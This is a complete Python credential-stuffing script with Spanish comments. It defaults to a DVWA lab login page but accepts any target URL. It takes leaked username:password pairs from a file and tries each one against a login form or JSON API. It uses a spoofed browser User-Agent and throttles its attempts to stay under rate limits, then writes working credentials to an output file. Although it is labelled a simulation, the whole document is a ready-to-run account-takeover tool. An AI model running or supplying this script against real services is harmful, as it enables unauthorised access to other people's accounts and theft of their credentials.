#!/usr/bin/env python3
"""
Credential Stuffing Simulation Script
Intenta login con pares específicos usuario:contraseña contra un objetivo
"""

import requests
import argparse
import time
from urllib.parse import urljoin
from colorama import init, Fore, Style

# Iniciarlo colorama para output colorido
init(autoreset=True)

# Configuración por defecto
DEFAULT_TARGET = "http://dvwa/login.php"
DEFAULT_CREDENTIALS = "leaked_credentials.txt"
DEFAULT_SUCCESS = "Welcome"
DEFAULT_FAIL = "Login failed"
DEFAULT_DELAY = 0.5

def test_credential_form(session, target_url, username, password, success_str, fail_str):
    """Intenta login en formulario HTML"""
    data = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    
    try:
        response = session.post(target_url, data=data, timeout=5)
        
        if success_str in response.text:
            return "valid"
        elif fail_str in response.text:
            return "invalid"
        else:
            return "ambiguous"
    except requests.exceptions.RequestException as e:
        return f"error: {e}"

def test_credential_api(session, target_url, username, password):
    """Intenta login en API JSON"""
    data = {"username": username, "password": password}
    
    try:
        response = session.post(target_url, json=data, timeout=5)
        json_resp = response.json()
        
        if json_resp.get('success'):
            return "valid"
        else:
            return "invalid"
    except:
        return "error"

def main():
    parser = argparse.ArgumentParser(description='Credential Stuffing Simulation')
    parser.add_argument('--target', default=DEFAULT_TARGET, help='Target URL')
    parser.add_argument('--credentials', default=DEFAULT_CREDENTIALS, help='Credentials file')
    parser.add_argument('--success', default=DEFAULT_SUCCESS, help='Success indicator string')
    parser.add_argument('--fail', default=DEFAULT_FAIL, help='Fail indicator string')
    parser.add_argument('--delay', type=float, default=DEFAULT_DELAY, help='Delay between attempts (seconds)')
    parser.add_argument('--api', action='store_true', help='Target is JSON API')
    parser.add_argument('--output', default='valid_credentials.txt', help='Output file for valid credentials')
    
    args = parser.parse_args()
    
    print(Fore.CYAN + "=" * 60)
    print(Fore.CYAN + "Credential Stuffing Simulation")
    print(Fore.CYAN + "=" * 60)
    print(f"Target: {args.target}")
    print(f"Credentials: {args.credentials}")
    print(f"Delay: {args.delay}s")
    print(Fore.CYAN + "=" * 60 + "\n")
    
    # Crear sesión persistente
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Contadores
    valid_creds = []
    total = 0
    invalid = 0
    errors = 0
    
    # Leer y procesar credenciales
    try:
        with open(args.credentials, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                    
                username, password = line.split(':', 1)
                total += 1
                
                print(f"[{total:3d}] {username:30s} ", end='')
                
                # Ejecutar intento
                if args.api:
                    result = test_credential_api(session, args.target, username, password)
                else:
                    result = test_credential_form(session, args.target, username, password, 
                                                  args.success, args.fail)
                
                # Mostrar resultado
                if result == "valid":
                    print(Fore.GREEN + "✓ VÁLIDA")
                    valid_creds.append((username, password))
                elif result == "invalid":
                    print(Fore.RED + "✗ Inválida")
                    invalid += 1
                else:
                    print(Fore.YELLOW + f"? {result}")
                    errors += 1
                
                # Delay para evitar rate limiting
                time.sleep(args.delay)
                
    except FileNotFoundError:
        print(Fore.RED + f"\n[!] Error: Archivo no encontrado: {args.credentials}")
        return
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[!] Interrumpido por usuario")
    
    # Resultados finales
    print("\n" + Fore.CYAN + "=" * 60)
    print(Fore.CYAN + "RESULTADOS")
    print(Fore.CYAN + "=" * 60)
    print(f"Total probadas:      {total}")
    print(Fore.GREEN + f"Válidas encontradas: {len(valid_creds)}")
    print(Fore.RED + f"Inválidas:           {invalid}")
    print(Fore.YELLOW + f"Errores/Ambiguas:    {errors}")
    
    if total > 0:
        success_rate = len(valid_creds) / total * 100
        print(f"\nTasa de éxito:       {Fore.GREEN if success_rate > 0 else Fore.RED}{success_rate:.1f}%")
    
    print(Fore.CYAN + "=" * 60)
    
    # Guardar credenciales válidas
    if valid_creds:
        print(f"\n{Fore.GREEN}[+] Credenciales válidas:")
        for user, pwd in valid_creds:
            print(f"    {user}:{pwd}")
        
        with open(args.output, 'w') as f:
            for user, pwd in valid_creds:
                f.write(f"{user}:{pwd}\n")
        
        print(f"\n{Fore.GREEN}[*] Credenciales guardadas en: {args.output}")
    else:
        print(f"\n{Fore.YELLOW}[-] No se encontraron credenciales válidas")

if __name__ == "__main__":
    main()
